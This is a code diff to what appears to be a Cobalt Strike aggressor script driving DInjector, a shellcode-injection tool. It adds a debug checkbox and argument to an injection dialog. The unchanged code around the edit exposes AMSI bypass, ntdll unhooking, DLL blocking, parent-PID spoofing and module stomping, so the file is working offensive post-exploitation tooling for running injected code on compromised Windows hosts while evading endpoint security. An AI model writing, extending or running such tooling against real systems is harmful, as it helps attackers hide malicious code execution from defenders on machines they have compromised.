@@ -77,6 +77,10 @@ sub dinject {
         $cmd .= " /unhook:True";
     }
 
+    if (%options["debug"] eq "true") {
+        $cmd .= " /debug:True";
+    }
+
     # Execute DInjector
     bexecute_assembly($bid, script_resource("DInjector.exe"), "$cmd");
 
@@ -86,7 +90,7 @@ sub dinject {
          . " /image:" . %options["image"] . " /pid:" . %options["pid"] . " /ppid:" . %options["ppid"] . " /dll:" . %options["dll"]
          . " /stompDll:" . %options["stompDll"] . " /stompExport:" . %options["stompExport"] . " /sleep:" . %options["sleep"]
          . " /blockDlls:" . %options["blockDlls"] . " /am51:" . %options["am51"] . "/remoteAm51:" . %options["remoteAm51"]
-         . " /unhook:" . %options["unhook"]);
+         . " /unhook:" . %options["unhook"] . " /debug:" . %options["debug"]);
 }
 
 sub gen_random_string {
@@ -132,6 +136,7 @@ popup beacon_bottom {
         %options["am51"]        = "True";
         %options["remoteAm51"]  = "True";
         %options["unhook"]      = "false";
+        %options["debug"]       = "false";
 
         # Create a dialog
         $dialog = dialog("Dynamic Shellcode Injection", %options, &dinject);
@@ -182,6 +187,7 @@ popup beacon_bottom {
 
         drow_checkbox($dialog, "blockDlls", "[/blockDlls] DLLs:", "Block 3rd-party DLLs");
         drow_checkbox($dialog, "unhook",    "[/unhook] Unhook:",  "Unhook ntdll.dll");
+        drow_checkbox($dialog, "debug",     "[/debug] Debug:",  "Print debug messages");
 
         dbutton_action($dialog, "Inject");
 
